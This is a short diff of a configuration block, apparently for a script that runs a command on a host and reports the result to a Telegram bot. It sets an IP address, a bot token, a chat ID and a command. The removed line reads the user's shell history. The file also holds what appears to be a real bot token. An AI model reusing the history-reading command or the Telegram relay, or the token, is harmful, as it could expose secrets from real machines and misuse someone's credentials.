@@ -1,4 +1,4 @@
 IP="10.211.55.11"
-cmd="cd ~ && cat .bash_history"
+cmd="ls -al"
 token="bot5975250323:AAHavbihpd-eNaCLZKDdF4sCYuhgMzbfHE4"
 chatid="5710132140"
